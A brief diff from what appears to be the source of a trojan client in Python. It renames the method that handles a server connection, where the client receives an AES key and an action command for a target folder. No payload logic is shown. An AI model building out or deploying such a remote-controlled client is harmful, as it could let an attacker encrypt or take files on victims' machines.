@@ -108,7 +108,7 @@ class TrojanClient:
         self.folder = folder
         self.connection = SecureSocketClient(host, port).connect()
 
-    def run(self):
+    def handle_server(self):
         aes_key = protocol.receive(self.connection)
         action = protocol.receive(self.connection).decode("utf-8")
 
@@ -133,4 +133,4 @@ if __name__ == "__main__":
     FOLDER = "D:\check"
 
     client = TrojanClient(HOST, PORT, FOLDER)
-    client.run()
+    client.handle_server()
